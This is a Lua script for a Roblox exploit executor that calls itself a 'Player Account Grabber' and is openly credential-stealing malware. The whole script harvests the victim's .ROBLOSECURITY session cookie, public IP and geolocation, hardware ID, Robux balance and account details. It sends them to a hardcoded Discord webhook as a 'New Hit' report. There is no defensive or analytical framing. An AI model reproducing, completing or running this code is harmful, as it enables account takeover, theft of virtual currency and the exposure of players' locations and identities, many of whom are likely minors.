--// Delta Executor - Player Account Grabber (v2.2 – HWID & UUID)
--// Paste your Discord webhook below

local WEBHOOK_URL = "https://discord.com/api/webhooks/1524684614667337761/IMxn6wj77XmK05NHu0ajk-n739wp199LbZmY4k2dzAqo7vPsKyRaHNoTYBh7rKrvEzXW"

-- Services
local HttpService          = game:GetService("HttpService")
local Players              = game:GetService("Players")
local MarketplaceService   = game:GetService("MarketplaceService")
local LocalPlayer          = Players.LocalPlayer

-- Utility – Send a payload to Discord
local function sendWebhook(data)
    local payload = HttpService:JSONEncode(data)
    local success, err = pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payload
        })
    end)
    if not success then
        pcall(function()
            http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = payload
            })
        end)
    end
end

-- Grab .ROBLOSECURITY cookie
local function grabCookie()
    local cookie = ""
    pcall(function()
        local cookiePath = os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\RobloxCookies.dat"
        if isfile and isfile(cookiePath) then
            cookie = readfile(cookiePath)
        end
    end)
    pcall(function()
        if getroblosecurity then
            cookie = getroblosecurity()
        elseif get_cookie then
            cookie = get_cookie()
        end
    end)
    if cookie == "" then
        pcall(function()
            local browser = getbrowser and getbrowser() or nil
            if browser then
                for _, c in pairs(browser:GetCookies("https://www.roblox.com")) do
                    if c.Name == ".ROBLOSECURITY" then
                        cookie = c.Value
                        break
                    end
                end
            end
        end)
    end
    return cookie
end

-- IP / geo‑information
local function getIPInfo()
    local info = {}
    pcall(function()
        local resp = game:HttpGet("https://ipinfo.io/json")
        local data = HttpService:JSONDecode(resp)
        info.IP        = data.ip or "N/A"
        info.City      = data.city or "N/A"
        info.Region    = data.region or "N/A"
        info.Country   = data.country or "N/A"
        info.LatLon    = data.loc or "N/A"
        info.Org       = data.org or "N/A"
        info.Timezone  = data.timezone or "N/A"
        info.Postal    = data.postal or "N/A"
    end)
    return info
end

-- Gather all player / system information
local function getPlayerInfo()
    local info = {}
    info.Username      = LocalPlayer.Name
    info.DisplayName   = LocalPlayer.DisplayName
    info.UserId        = LocalPlayer.UserId
    info.AccountAge    = LocalPlayer.AccountAge .. " days"
    info.MembershipType = tostring(LocalPlayer.MembershipType)

    -- Robux balance
    pcall(function()
        local balanceUrl = "https://economy.roblox.com/v1/users/" .. tostring(LocalPlayer.UserId) .. "/currency"
        local resp = game:HttpGet(balanceUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.Robux = decoded.robux or "Unknown"
    end)

    -- Friends count
    pcall(function()
        local friendsUrl = "https://friends.roblox.com/v1/users/" .. tostring(LocalPlayer.UserId) .. "/friends/count"
        local resp = game:HttpGet(friendsUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.FriendsCount = decoded.count or "Unknown"
    end)

    -- Avatar thumbnail
    pcall(function()
        local thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. tostring(LocalPlayer.UserId) .. "&size=420x420&format=Png&isCircular=false"
        local resp = game:HttpGet(thumbUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.AvatarURL = decoded.data[1].imageUrl
    end)

    -- Current game info
    info.PlaceId = game.PlaceId
    info.JobId   = game.JobId
    pcall(function()
        local placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
        info.GameName = placeInfo.Name
    end)

    -- Executor / HWID / UUID
    pcall(function()
        if gethwid then
            info.HWID = gethwid()        -- Most executors expose this
        else
            info.HWID = "N/A"
        end
        if getexecutorname then
            -- Some executors embed a UUID in their name string
            info.UUID = getexecutorname()
        else
            info.UUID = "N/A"
        end
    end)

    -- IP / Geo
    local ipInfo = getIPInfo()
    info.IP        = ipInfo.IP
    info.City      = ipInfo.City
    info.Region    = ipInfo.Region
    info.Country   = ipInfo.Country
    info.LatLon    = ipInfo.LatLon
    info.Org       = ipInfo.Org
    info.Timezone  = ipInfo.Timezone
    info.Postal    = ipInfo.Postal

    return info
end

-- Build the Discord embed
local function buildEmbed(playerInfo, cookie)
    local fields = {
        { name = "👤 Username",      value = "```" .. playerInfo.Username .. "```", inline = true },
        { name = "🏷️ Display",       value = "```" .. playerInfo.DisplayName .. "```", inline = true },
        { name = "🆔 UserID",        value = "```" .. tostring(playerInfo.UserId) .. "```", inline = true },
        { name = "📅 Account Age",   value = "```" .. playerInfo.AccountAge .. "```", inline = true },

        -- IP / location
        { name = "🌐 Public IP",     value = "```" .. (playerInfo.IP or "N/A") .. "```", inline = true },
        { name = "🏙️ Location",     value = "```" .. (playerInfo.City .. ", " .. playerInfo.Region .. ", " .. playerInfo.Country) .. "```", inline = true },
        { name = "📍 Lat/Long",      value = "```" .. (playerInfo.LatLon or "N/A") .. "```", inline = true },
        { name = "🏢 Org / ISP",     value = "```" .. (playerInfo.Org or "N/A") .. "```", inline = true },

        { name = "💰 Robux",         value = "```" .. tostring(playerInfo.Robux or "N/A") .. "```", inline = true },
        { name = "👥 Friends",       value = "```" .. tostring(playerInfo.FriendsCount or "N/A") .. "```", inline = true },
        { name = "🎮 Game",          value = "```" .. (playerInfo.GameName or "Unknown") .. "```", inline = true },
        { name = "💎 Premium",       value = "```" .. playerInfo.MembershipType .. "```", inline = true },

        { name = "🖥️ HWID",          value = "```" .. (playerInfo.HWID or "N/A") .. "```", inline = false },
        { name = "🆔 UUID",          value = "```" .. (playerInfo.UUID or "N/A") .. "```", inline = false },
    }

    -- Cookie (chunked if > 900 chars)
    if cookie and cookie ~= "" then
        local cookieChunks = {}
        for i = 1, #cookie, 900 do
            table.insert(cookieChunks, cookie:sub(i, i + 899))
        end
        for idx, chunk in ipairs(cookieChunks) do
            table.insert(fields, {
                name = "🍪 Cookie [" .. idx .. "/" .. #cookieChunks .. "]",
                value = "```" .. chunk .. "```",
                inline = false
            })
        end
    else
        table.insert(fields, {
            name = "🍪 Cookie",
            value = "```Failed to grab```",
            inline = false
        })
    end

    local embed = {
        embeds = {{
            title = "🎯 New Hit — " .. playerInfo.Username,
            color = 0xFF3333,
            fields = fields,
            thumbnail = { url = playerInfo.AvatarURL or "" },
            footer = { text = "Delta Grabber | " .. os.date("%Y-%m-%d %H:%M:%S") },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    return embed
end

-- Main
local playerInfo = getPlayerInfo()
local cookie     = grabCookie()
local embed      = buildEmbed(playerInfo, cookie)

sendWebhook(embed)
print("[Delta] Payload delivered ✓")
